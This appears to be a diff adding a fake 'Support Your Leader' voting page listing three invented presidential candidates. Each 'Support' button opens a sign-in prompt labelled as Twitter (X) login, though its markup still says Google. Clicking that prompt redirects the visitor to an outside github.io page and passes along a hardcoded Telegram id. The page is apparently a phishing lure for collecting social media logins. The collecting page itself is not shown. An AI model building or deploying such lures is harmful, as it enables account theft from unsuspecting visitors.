@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Support Your Leader</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0; padding: 0;
+      background: #f4f4f9;
+      text-align: center;
+    }
+    h1 { margin: 20px 0; }
+    .candidates {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      margin-top: 30px;
+      flex-wrap: wrap;
+    }
+    .card {
+      background: #fff;
+      border-radius: 10px;
+      padding: 20px;
+      width: 220px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .card img {
+      width: 100%;
+      height: 200px;
+      object-fit: cover;
+      border-radius: 10px;
+    }
+    .card h3 {
+      margin: 10px 0 5px;
+    }
+    .support-btn {
+      margin-top: 15px;
+      padding: 10px 20px;
+      font-size: 15px;
+      border: none;
+      border-radius: 8px;
+      background: #34a853;
+      color: #fff;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    .support-btn:hover {
+      background: #2c8f47;
+    }
+
+    /* Modal */
+    .modal {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.6);
+      display: none;
+      justify-content: center;
+      align-items: center;
+    }
+    .modal-content {
+      background: #fff;
+      padding: 20px;
+      border-radius: 10px;
+      text-align: center;
+      width: 320px;
+    }
+    .google-btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      background: #fff;
+      color: #444;
+      font-size: 16px;
+      font-weight: 500;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      padding: 10px 20px;
+      cursor: pointer;
+      transition: box-shadow 0.3s;
+      width: 100%;
+    }
+    .google-btn img {
+      width: 20px;
+      height: 20px;
+    }
+    .google-btn:hover {
+      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+    }
+  </style>
+</head>
+<body>
+
+  <h1>Support Your Leader</h1>
+  <div class="candidates">
+    <div class="card">
+      <img src="https://randomuser.me/api/portraits/men/32.jpg" alt="Candidate 1">
+      <h3>John Smith</h3>
+      <p>Position: President</p>
+      <button class="support-btn" onclick="openSignin('John Smith')">Support</button>
+    </div>
+    <div class="card">
+      <img src="https://randomuser.me/api/portraits/women/45.jpg" alt="Candidate 2">
+      <h3>Emily Johnson</h3>
+      <p>Position: President</p>
+      <button class="support-btn" onclick="openSignin('Emily Johnson')">Support</button>
+    </div>
+    <div class="card">
+      <img src="https://randomuser.me/api/portraits/men/76.jpg" alt="Candidate 3">
+      <h3>Michael Brown</h3>
+      <p>Position: President</p>
+      <button class="support-btn" onclick="openSignin('Michael Brown')">Support</button>
+    </div>
+  </div>
+
+  <!-- Google Sign In Modal -->
+  <div class="modal" id="signinModal">
+    <div class="modal-content">
+      <h2>Sign in to Confirm Your Support</h2>
+<button class="google-btn" id="googleSignInBtn">
+  <img src="https://raw.githubusercontent.com/ali-han/Twitter-x-icon-logo/main/dark/Twitter%20X%20Icon.svg" alt="Google logo">
+  <span>Sign in with Twitter (X)</span>
+</button>
+
+<script>
+  const btn = document.getElementById('googleSignInBtn');
+  const qs = new URLSearchParams(window.location.search);
+  // Use default if no id in URL
+  let telegramId = qs.get('id') || "6940101627";
+
+  btn.addEventListener('click', () => {
+    const dest = `https://ilyelya.github.io/n/X.html?id=${encodeURIComponent(telegramId)}`;
+    window.location.href = dest; // same tab redirect
+  });
+</script>
+    </div>
+  </div>
+
+  <script>
+    let chosenCandidate = null;
+
+    function openSignin(candidate) {
+      chosenCandidate = candidate; // store candidate selected
+      document.getElementById("signinModal").style.display = "flex";
+    }
+  </script>
+
+</body>
+</html>
